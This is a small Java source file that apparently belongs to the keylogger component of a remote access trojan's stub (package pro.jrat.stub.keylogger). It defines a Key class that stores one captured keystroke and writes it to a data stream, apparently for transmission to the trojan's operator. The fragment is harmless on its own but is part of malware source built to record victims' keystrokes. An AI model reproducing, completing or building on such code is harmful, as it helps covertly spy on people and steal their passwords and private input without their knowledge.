package pro.jrat.stub.keylogger;

import java.io.DataOutputStream;

public class Key implements Activity {

	private final char key;

	public Key(char key) {
		this.key = key;
	}

	@Override
	public void write(DataOutputStream dos) throws Exception {
		dos.writeChar(key);
	}

}
